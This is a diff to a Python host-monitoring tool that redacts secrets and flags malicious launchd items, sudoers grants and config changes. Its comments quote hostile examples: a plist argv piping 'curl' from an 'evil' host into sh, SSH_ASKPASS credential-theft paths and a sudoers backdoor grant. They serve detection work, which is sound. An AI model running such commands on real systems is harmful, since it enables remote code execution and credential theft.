@@ -60,7 +60,7 @@ from datetime import datetime, timedelta
 from pathlib import Path
 
 __version__ = "0.4.4"
-SCHEMA_VERSION = 4   # 4 adds snap['tools'] (collector tool identity)
+SCHEMA_VERSION = 5   # 4: snap['tools'] (tool identity); 5: snap['blob_flags']
 
 if sys.version_info < (3, 9):  # uses PEP 585 generics in annotations + os.replace
     sys.exit("since requires Python 3.9 or newer")
@@ -151,6 +151,7 @@ def tilde(p: str) -> str:
     return p
 
 
+MAX_ARGV = 4096              # cap the plist argv string we scan/render
 MAX_READ = 8 * 1024 * 1024   # plists/.desktop/manifests/rc files are KBs; 8MB is generous
 DIFF_MAX_LINES = 20_000      # above this, report the change without a quadratic line diff
 DIFF_MAX_BYTES = 1024 * 1024
@@ -308,7 +309,7 @@ _TOKEN_RE = re.compile(                                                     # st
 # Anchored, bounded, no nested quantifier — linear.
 _CMDPASS_RE = re.compile(
     r"(?i)(\b(?:sshpass\s+-p|sshpass\s+--password[= ]|--password[= ]|--token[= ]|"
-    r"mysql(?:dump|admin)?\s+(?:-\w+\s+){0,4}-p)\s*)(\S+)")
+    r"mysql(?:dump|admin)?\s+(?:-\w+(?:[= ]\S+)?\s+){0,4}-p)\s*)(\S+)")
 _B64LINE_RE = re.compile(r"^[A-Za-z0-9+/]{40,}={0,2}$")                     # PEM body / raw key
 _KW_VALUES = {"yes", "no", "true", "false", "none", "null", "required",
               "optional", "default", "auto", "inherit", "prohibit-password"}
@@ -331,17 +332,33 @@ _SUDO_TAGS = ("PASSWD", "NOPASSWD")
 # more TAGS (`PASSWD:NOEXEC: /tmp/miner`) or a comma list (`ALL, !/usr/bin/su`). The v0.4.3
 # gate tested only `tok == "ALL" or tok[0] in "/!"`, so both ordinary spellings still had the
 # granted command list redacted away — the single most important thing in a sudoers diff.
-_SUDO_CMD_RE = re.compile(r"^(?:ALL\b|[/!])")
+_SUDO_CMD_RE = re.compile(r"^(?:ALL(?=$|[\s,:=])|[/!])")   # \b also matched `ALL,<secret>`
 _SUDO_TAG_RE = re.compile(r"^(?:NO)?(?:PASSWD|EXEC|SETENV|LOG_INPUT|LOG_OUTPUT|"
                           r"MAIL|FOLLOW|INTERCEPT):", re.I)
 # Keys whose VALUE is a FILESYSTEM PATH even though the key names a credential: every one is
 # a known credential-theft / agent-hijack technique when planted in a tracked rc file
 # (SSH_ASKPASS=/tmp/steal.sh, SSH_AUTH_SOCK=/tmp/.evil/agent.sock, PGPASSFILE=…), and the
 # path IS the finding. The unconditional `=`/`:` redaction concealed them completely.
+# A real filesystem path, i.e. one with a directory separator — NOT merely "starts with / ~ $".
+# The looser test leaked: a base64 secret starts with '/' about 1 time in 64 and every
+# crypt/bcrypt hash starts with '$', so `SECRET_FILE=/hunter2…` printed in cleartext.
+_REAL_PATH_RE = re.compile(r"^(?:/[^/\s]+/|~/|\./|\.\./|\$\{?\w+\}?/)")
 _PATH_VALUED_KEY_RE = re.compile(
     r"(?i)(askpass|passfile|pass_file|keysfile|keyscommand|[_-]sock$|_socket$|"
     r"[_-]file$|[_-]dir$|[_-]path$)")
 _REDACT_MAX = 4096
+
+_SHOW_MAX_DEPTH = 8    # bounds the tail rescan; at the cap redact rather than recurse
+
+def _sudo_cmd_spec(tok: str) -> bool:
+    """True if `tok` opens a sudoers COMMAND SPEC: a further tag (`NOEXEC:`), or `ALL` /
+    (negated) absolute paths, possibly as a comma list. Checking only the first element let
+    `PASSWD: ALL,<secret>` through, because the gate then exempts the whole remainder."""
+    if _SUDO_TAG_RE.match(tok):
+        return True
+    parts = [p.strip() for p in tok.split(",") if p.strip()]
+    return bool(parts) and all(_SUDO_CMD_RE.match(p) for p in parts)
+
 
 def _char_classes(tok: str) -> int:
     return sum(bool(re.search(p, tok)) for p in (r"[a-z]", r"[A-Z]", r"[0-9]", r"[^A-Za-z0-9]"))
@@ -381,24 +398,40 @@ def redact(line: str) -> str:
     line = _USERPASS_RE.sub(r"\1«redacted»", line)
     line = _TOKEN_RE.sub("«redacted»", line)
 
-    def _show(m, key, sep, val):
+    def _show(m, key, sep, val, depth):
         """A SHOW decision must expose only THIS key's value, not the whole rest of the line:
         `_KV_RE`'s value group runs to end-of-line, so returning it verbatim also exempted any
-        later secret on the same line (`AuthorizedKeysCommand /usr/bin/fk --api-key=<secret>`,
-        `NOPASSWD: /usr/bin/sshpass -p <secret>`). Re-scan the tail; each nested pass consumes
-        at least its own key, so this terminates."""
-        inner = _KV_RE.sub(_kv, val) if _KV_KW_RE.search(val) else val
+        later secret on the same line (`AuthorizedKeysCommand /usr/bin/fk --api-key=<secret>`).
+        Re-scan the tail — but BOUND the nesting: "each pass consumes its own key so it
+        terminates" was true and useless, because one line can hold hundreds of keys. A 2.5KB
+        comment of repeated `_pwd ` (well under _REDACT_MAX, so truncation did not help)
+        recursed ~800 deep and raised RecursionError, which nothing catches: the digest died
+        before saving a snapshot, so the planted line stayed "added" and every later run died
+        identically — an unprivileged one-line kill switch. At the cap, fail SAFE (redact)."""
+        if depth >= _SHOW_MAX_DEPTH:
+            return f"{key}{sep}«redacted»"
+        inner = (_KV_RE.sub(lambda mm: _kv(mm, depth + 1), val)
+                 if _KV_KW_RE.search(val) else val)
         inner = _CMDPASS_RE.sub(lambda mm: f"{mm.group(1)}«redacted»", inner)
         return f"{key}{sep}{inner}"
 
-    def _kv(m):
+    def _kv(m, depth=0):
         key, sep, val = m.group(1), m.group(2), m.group(3)
         tok = val.split()[0] if val.split() else ""
+        # A key preceded by '/' is a FILENAME component, not an assignment target: in
+        # `NOPASSWD: /usr/bin/passwd backdoor2026` the "key" is the command being granted, and
+        # treating it as a credential redacted the account being reset — the single most
+        # important detail in a sudoers diff. Same for `/usr/local/bin/passwd_sync.sh --dest …`.
+        if m.start(1) > 0 and m.string[m.start(1) - 1] == "/":
+            return _show(m, key, sep, val, depth)
         # sudoers TAGS are grants, not secrets — but gate on the EXACT uppercase tag, not a
         # substring: `"nopasswd" in key` also exempted `export NOPASSWD_TOKEN=<secret>`.
-        if key in _SUDO_TAGS and ":" in sep and (_SUDO_CMD_RE.match(tok)
-                                                 or _SUDO_TAG_RE.match(tok)):
-            return _show(m, key, sep, val)
+        if key in _SUDO_TAGS and ":" in sep and _sudo_cmd_spec(tok):
+            # INTACT, deliberately: the granted command list is the payload of a sudoers diff
+            # (which account is reset, which host the command talks to). Rescanning it masked
+            # exactly that. Known credential shapes inside it were already masked above by
+            # _CMDPASS_RE / _TOKEN_RE / _SCHEME_RE, which run over the whole line first.
+            return m.group(0)
         if _HARD_SECRET_RE.search(key):
             # The key literally NAMES a credential, so the value IS the secret.
             # An assignment (`password=…`, `_auth:…`, `SSHPASS=…`) redacts UNCONDITIONALLY:
@@ -415,11 +448,14 @@ def redact(line: str) -> str:
                 # stays unconditionally masked: a real token can begin with '/' or '$'.
                 if len(val.split()) == 1 and (
                         tok.lower() in _KW_VALUES
-                        or (_PATH_VALUED_KEY_RE.search(key) and _is_directive_value(tok))):
-                    return m.group(0)   # single-token value: nothing follows to re-scan
+                        or (_PATH_VALUED_KEY_RE.search(key) and _REAL_PATH_RE.match(tok))):
+                    # _show, NOT m.group(0): "one whitespace token" does NOT mean "nothing
+                    # follows" — a shell chains with ';'/'&&'/'|', so
+                    # `SSH_ASKPASS=/tmp/a.sh;MYSQL_PWD=<secret>` printed the password.
+                    return _show(m, key, sep, val, depth)
                 return f"{key}{sep}«redacted»"
             if _is_directive_value(tok) or len(tok) < 6 or _char_classes(tok) < 2:
-                return _show(m, key, sep, val)
+                return _show(m, key, sep, val, depth)
             return f"{key}{sep}«redacted»"
         # SOFT (falls through to _show, which re-scans the tail — see L5):
         # the key only CONTAINS a directive name (`AuthorizedKeysFile`,
@@ -427,7 +463,7 @@ def redact(line: str) -> str:
         # relative like `.ssh/authorized_keys`), a username, or a keyword — real token
         # shapes were already masked by the regexes above. SHOW it, so a malicious
         # AuthorizedKeys* change stays visible (the whole point of #2).
-        return _show(m, key, sep, val)
+        return _show(m, key, sep, val, depth)
     return _KV_RE.sub(_kv, line) if _KV_KW_RE.search(line) else line
 
 
@@ -465,26 +501,43 @@ def trust_of(path: str):
     return ("unknown", False)
 
 
-def program_of_plist(plist_path: str):
-    """Extract the executable a launchd plist runs, so we can trust-check it."""
+def plist_program_and_argv(plist_path: str):
+    """(program, full argv string) from a launchd plist. The argv matters as much as the
+    program: `ProgramArguments = ["/bin/sh","-c","curl -s http://evil|sh"]` resolves to
+    /bin/sh, which is genuinely Apple-signed — so the report printed "signature: Apple-signed"
+    next to a malicious startup item, which is worse than saying nothing. The caller scans the
+    argv for malicious patterns so the interpreter's own signature can't launder the payload."""
     real = plist_path.replace("~", str(HOME), 1) if plist_path.startswith("~") else plist_path
+    # Size-gate BEFORE spawning plutil: its output is read into memory, so a planted 500MB
+    # plist cost 2.27GB RSS at diff time (the collector read path is capped for this reason;
+    # this one was not). The 8s timeout does not bind — the work is linear, not slow.
+    try:
+        if not is_regular(real) or os.path.getsize(real) > MAX_READ:
+            return (None, "")
+    except OSError:
+        return (None, "")
     out = run(["plutil", "-convert", "json", "-o", "-", real], timeout=8)
     try:
         d = json.loads(out)
     except Exception:
-        return None
+        return (None, "")
     # A *valid* plist can have a non-dict root (`<array>`), so plutil emits `["x"]` and the
     # old `d.get(...)` raised AttributeError. That crash was fatal AND self-perpetuating:
     # the snapshot is saved only after build_findings, so the plist stayed "added" and the
     # daily digest died identically every day. Validate the shape of every value used.
     if not isinstance(d, dict):
-        return None
-    if isinstance(d.get("Program"), str):
-        return d["Program"]
+        return (None, "")
+    prog = d.get("Program") if isinstance(d.get("Program"), str) else None
     args = d.get("ProgramArguments")
-    if isinstance(args, list) and args and isinstance(args[0], str):
-        return args[0]
-    return None
+    argv = [a for a in args if isinstance(a, str)] if isinstance(args, list) else []
+    if prog is None and argv:
+        prog = argv[0]
+    return (prog, " ".join(argv)[:MAX_ARGV])
+
+
+def program_of_plist(plist_path: str):
+    """Just the executable a launchd plist runs, so we can trust-check it."""
+    return plist_program_and_argv(plist_path)[0]
 
 
 # ---------------------------------------------------------------------------
@@ -672,7 +725,7 @@ def _mac_net_config():
 def _mac_brew():
     need("brew")
     res = {}
-    for line in run(["brew", "list", "--versions"], timeout=40).splitlines():
+    for line in run_checked(["brew", "list", "--versions"], timeout=40).splitlines():
         parts = line.split()
         if parts:
             res[parts[0]] = parts[-1] if len(parts) > 1 else ""
@@ -686,7 +739,7 @@ def _mac_brew():
 
 def _npm_global():
     need("npm")
-    out = run(["npm", "ls", "-g", "--depth=0", "--json"], timeout=25)
+    out = run_checked(["npm", "ls", "-g", "--depth=0", "--json"], timeout=25)
     if not out.strip():
         return {}
     try:
@@ -702,7 +755,7 @@ def _pip():
     # disagree. need() at least turns "pip3 absent" into a guarded skip rather than
     # "every package removed"; install.sh pins the job's PATH so both agree.
     need("pip3")
-    out = run(["pip3", "list", "--format=freeze"], timeout=25)
+    out = run_checked(["pip3", "list", "--format=freeze"], timeout=25)
     res = {}
     for line in out.splitlines():
         if "==" in line:
@@ -728,7 +781,7 @@ def _mac_applications():
 
 def _mac_mas():
     need("mas")
-    out = run(["mas", "list"], timeout=15)
+    out = run_checked(["mas", "list"], timeout=15)
     res = {}
     for line in out.splitlines():
         m = re.match(r"(\d+)\s+(.*?)\s+\(([^)]+)\)\s*$", line)
@@ -759,6 +812,24 @@ def need(*tools):
     missing = [t for t in tools if not shutil.which(t)]
     if missing:
         raise ToolUnavailable("not on PATH: " + ", ".join(missing))
+
+
+def run_checked(cmd, timeout=15):
+    """run() but a FAILURE IS AN ERROR, not an empty result. `run()` returns "" for a timeout,
+    a crash and "no output" alike, so a `brew list` that timed out (40s, plausible under load)
+    produced an empty collector with NO error recorded — the capability guard keys off
+    snap["errors"], so it could not fire and the 192-phantom-removal flood came back, exactly
+    the incident this release claims to have fixed. Non-zero WITH output is tolerated: `npm ls -g`
+    exits non-zero on peer-dependency complaints while still printing valid JSON."""
+    try:
+        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, errors="replace")
+    except subprocess.TimeoutExpired:
+        raise ToolUnavailable(f"{cmd[0]} timed out after {timeout}s")
+    except OSError as e:
+        raise ToolUnavailable(f"{cmd[0]} could not run ({e.__class__.__name__})")
+    if p.returncode != 0 and not p.stdout.strip():
+        raise ToolUnavailable(f"{cmd[0]} failed (exit {p.returncode})")
+    return p.stdout
 
 
 def _has(cmd: str) -> bool:
@@ -1001,11 +1072,20 @@ def backend_for(cat_key: str):
 
 
 # text files whose *contents* we track, so we can show the exact line that changed
-def text_sources() -> dict[str, str]:
+def text_sources(flags: dict | None = None) -> dict[str, str]:
     out: dict[str, str] = {}
 
     def add(label, content):
         if content and content.strip():
+            # Scan for malicious patterns over the FULL content, BEFORE the storage cap: the
+            # stored blob is truncated at BLOB_MAX and the diff is skipped above DIFF_MAX_*, so
+            # a payload appended after ~300KB of padding never reached the diff — the change was
+            # still detected (the sha covers everything) but it silently fell RED -> ORANGE and
+            # lost its "why". Flags are diffed separately, so escalation survives truncation.
+            if flags is not None:
+                hits = sorted({desc for pat, desc in MALICIOUS_PATTERNS if pat.search(content)})
+                if hits:
+                    flags[label] = hits
             if len(content) > BLOB_MAX:
                 content = (content[:BLOB_MAX]
                            + f"\n… [truncated at {BLOB_MAX} bytes for storage; "
@@ -1088,6 +1168,7 @@ def take_snapshot(all_cats=True) -> dict:
                  if PLATFORM == "macos" else platform_module.node()),
         "collectors": {},
         "blobs": {},
+        "blob_flags": {},
         "errors": {},
     }
     for key, _lbl, _mac, _lin, _cls, _tier in CATEGORIES:
@@ -1102,7 +1183,9 @@ def take_snapshot(all_cats=True) -> dict:
             snap["collectors"][key] = {}
             snap["errors"][key] = str(e)
     try:
-        snap["blobs"] = text_sources()
+        flags: dict = {}
+        snap["blobs"] = text_sources(flags)
+        snap["blob_flags"] = flags
     except Exception as e:
         snap["errors"]["blobs"] = str(e)
     return snap
@@ -1473,6 +1556,11 @@ def _is_priv_blob(key: str) -> bool:
 CAT_TOOLS = {"brew": "brew", "npm_global": "npm", "pip": "pip3", "mac_app_store": "mas"}
 
 
+def _dict(v) -> dict:
+    """A dict or an empty one — never trust a field's TYPE in a snapshot we did not just build."""
+    return v if isinstance(v, dict) else {}
+
+
 def tool_identity() -> dict:
     return {cat: (shutil.which(tool) or "") for cat, tool in CAT_TOOLS.items()}
 
@@ -1482,8 +1570,12 @@ def unusable_cats(baseline: dict, current: dict) -> dict:
     snapshots. Comparing those fabricates mass add/remove — the same trap the privilege
     guard closes for listening/outbound. If it failed in BOTH there is nothing to compare
     either way, so skip silently; a one-sided failure is what the user must be told about."""
-    be = baseline.get("errors", {}) or {}
-    ce = current.get("errors", {}) or {}
+    # _dict(): the SAME class of bug this release fixed twice already (labels.json, per-category
+    # collector values). unusable_cats is the first code to read the BASELINE's errors/tools, and
+    # a wrong type there (hand-edit, bad restore, malware with state-dir write access) raised
+    # AttributeError/TypeError out of an unisolated path — killing the digest before it saved a
+    # snapshot, so the bad baseline was re-read and it failed identically every day.
+    be, ce = _dict(baseline.get("errors")), _dict(current.get("errors"))
     out = {}
     for k in set(be) | set(ce):
         if k in CAT and (k in be) != (k in ce):
@@ -1492,7 +1584,8 @@ def unusable_cats(baseline: dict, current: dict) -> dict:
     # (a shell run finds /opt/homebrew/bin/pip3, the launchd job finds /usr/bin/pip3), so
     # every package looks swapped. Fail CLOSED when either side is unstamped (pre-v0.4.4):
     # we can't confirm they agree, and a fabricated flood can bury a real install.
-    bt, ct = baseline.get("tools"), current.get("tools")
+    bt = _dict(baseline.get("tools")) if isinstance(baseline.get("tools"), dict) else None
+    ct = _dict(current.get("tools")) if isinstance(current.get("tools"), dict) else None
     for cat in CAT_TOOLS:
         if cat in out or cat not in CAT:
             continue
@@ -1510,10 +1603,9 @@ def coverage_lost(baseline: dict, current: dict, unusable: dict) -> dict:
     but silently skipping it is not: losing visibility is itself a security event, and an
     attacker who breaks `brew` would otherwise buy silence for their own install. A first run,
     or a baseline predating tool stamping, is NOT a loss — that's benign and gets a note only."""
-    bt = baseline.get("tools") or {}
-    ct = current.get("tools")
-    be = baseline.get("errors", {}) or {}
-    ce = current.get("errors", {}) or {}
+    bt = _dict(baseline.get("tools"))
+    ct = _dict(current.get("tools")) if isinstance(current.get("tools"), dict) else None
+    be, ce = _dict(baseline.get("errors")), _dict(current.get("errors"))
     lost = {}
     for cat, why in unusable.items():
         had_it = bool(bt.get(cat)) and cat not in be      # baseline could genuinely see it
@@ -1531,8 +1623,40 @@ def coverage_lost(baseline: dict, current: dict, unusable: dict) -> dict:
     return lost
 
 
+def cat_usable(cat: str, snap: dict) -> bool:
+    """Could `snap` actually SEE this category? (no collector error, and its tool resolved)"""
+    if cat in _dict(snap.get("errors")):
+        return False
+    if cat in CAT_TOOLS and not _dict(snap.get("tools")).get(cat):
+        return False
+    return True
+
+
+def recover_baselines(current: dict, unusable) -> dict:
+    """{category: older_snapshot} for each skipped category we can see NOW — the newest earlier
+    snapshot that could see it with the SAME tool.
+
+    Without this a skipped category silently vanishes: the blind snapshot still becomes
+    tomorrow's baseline, so a package installed during the blind window is never reported by any
+    run, ever, while the report says "Nothing changed". Walking back recovers it as soon as the
+    collector works again."""
+    out = {}
+    for cat in sorted(unusable):
+        if not cat_usable(cat, current):
+            continue                     # still blind now: nothing to compare against
+        want = _dict(current.get("tools")).get(cat)
+        for path in reversed(list_snapshot_paths()):
+            older = safe_load(path)
+            if (older and cat_usable(cat, older)
+                    and _dict(older.get("tools")).get(cat) == want):
+                out[cat] = older
+                break
+    return out
+
+
 def build_findings(baseline: dict, current: dict, include_quiet=False, skip_cats=(),
-                   skip_priv_blobs=False, coverage: dict | None = None) -> list[dict]:
+                   skip_priv_blobs=False, coverage: dict | None = None,
+                   skip_blobs=False) -> list[dict]:
     rules = load_ignores()
     findings: list[dict] = []
     for key, meta in CAT.items():
@@ -1589,7 +1713,7 @@ def build_findings(baseline: dict, current: dict, include_quiet=False, skip_cats
                     f["trust"] = f"enrichment failed ({type(e).__name__})"
                 findings.append(f)
     # text blobs (system files)
-    bb, bc = baseline.get("blobs", {}), current.get("blobs", {})
+    bb, bc = ({}, {}) if skip_blobs else (baseline.get("blobs", {}), current.get("blobs", {}))
     for key in sorted(set(bb) | set(bc)):
         ob, oc = bb.get(key), bc.get(key)
         if ob == oc:
@@ -1620,6 +1744,14 @@ def build_findings(baseline: dict, current: dict, include_quiet=False, skip_cats
             if pat.search(added_text):
                 level, why = RED, desc
                 break
+        # …and independently of the diff text: a flag that is NEW in this snapshot escalates even
+        # when the payload sits past BLOB_MAX or the line diff was skipped for size (see
+        # text_sources). Flags are computed over the whole file at snapshot time.
+        if why is None:
+            new_flags = [d for d in _dict(current.get("blob_flags")).get(key, [])
+                         if d not in _dict(baseline.get("blob_flags")).get(key, [])]
+            if new_flags:
+                level, why = RED, new_flags[0]
         findings.append({"category": "config", "label": "System files", "cls": "config",
                          "action": status, "key": key, "value": None, "level": level,
                          "trust": None, "why": why, "undo": None, "diff": udiff})
@@ -1637,11 +1769,24 @@ def build_findings(baseline: dict, current: dict, include_quiet=False, skip_cats
 def _enrich(f: dict, current: dict):
     cat, action, key = f["category"], f["action"], f["key"]
     # signing/trust for new persistence programs & apps
+    # persistence: check "changed" too — overwriting an EXISTING plist is the classic hijack,
+    # and it previously got only a YELLOW content-hash line with no trust check and no notify.
+    if action in ("added", "changed") and cat == "launch_items":
+        prog, argv = plist_program_and_argv(key)
+        if prog:
+            label, suspicious = trust_of(prog)
+            f["trust"] = label
+            if suspicious:
+                f["level"] = RED
+        for pat, desc in MALICIOUS_PATTERNS:
+            if argv and pat.search(argv):
+                f["level"], f["why"] = RED, desc     # beats any signature on the interpreter
+                break
+        if action == "changed":
+            f["level"] = max(f["level"], ORANGE)
     if action == "added":
         prog = None
-        if cat == "launch_items":
-            prog = program_of_plist(key)
-        elif cat == "applications":
+        if cat == "applications":
             # bare_key: the ' (~/Applications)' disambiguator is not part of the path
             prog = f"{f['value']}/{bare_key(key)}.app"
         if prog:
@@ -1800,7 +1945,11 @@ def render(findings, baseline, current, big_files, growing, include_quiet=False,
 
     if len([x for x in L if x]) <= 2 + len(notes):
         L.append("")
-        L.append(paint("Nothing changed. 🎉", "green"))
+        if any("comparison skipped" in n for n in notes):
+            L.append(paint("No changes in what could be compared — but see the note(s) above: "
+                           "at least one category could NOT be compared.", "yellow"))
+        else:
+            L.append(paint("Nothing changed. 🎉", "green"))
 
     if not IS_ROOT:
         L.append("")
@@ -2010,11 +2159,26 @@ def cmd_diff(args, notify_on=False):
                      f"{'root' if current.get('root') else 'user'}) — "
                      "listening/outbound and sudoers/crontab comparison skipped to avoid false alarms.")
 
+    # A skipped category must not simply VANISH. The blind snapshot still becomes tomorrow's
+    # baseline, so without this an install made during the blind window is never reported by any
+    # run, ever — while the report cheerfully says "Nothing changed". Fall back to the newest
+    # EARLIER snapshot that could see the category with the same tool, and diff that instead.
+    recovered = recover_baselines(current, unusable)
+
     findings = build_findings(baseline, current, coverage=lost, include_quiet=args.all,
                               skip_cats=skip, skip_priv_blobs=skip_priv_blobs)
     big, growing, big_note = find_big_new_files(baseline.get("epoch", current["epoch"]))
     if big_note:
         notes.append(big_note)
+
+    for cat, older in sorted(recovered.items()):
+        findings += build_findings(older, current, include_quiet=args.all, skip_blobs=True,
+                                   skip_cats=tuple(k for k in CAT if k != cat))
+        notes.append(f"{CAT[cat]['label']}: the baseline couldn't see it, so it was compared "
+                     f"against the older snapshot from {clean(str(older.get('created')))[:16]}.")
+    if recovered:
+        findings.sort(key=lambda f: (-f["level"], f["category"], f["key"]))
+        skip = tuple(c for c in skip if c not in recovered)
 
     if args.json:
         # The baseline/corrupt-snapshot note (e.g. "N unreadable snapshot(s) skipped",
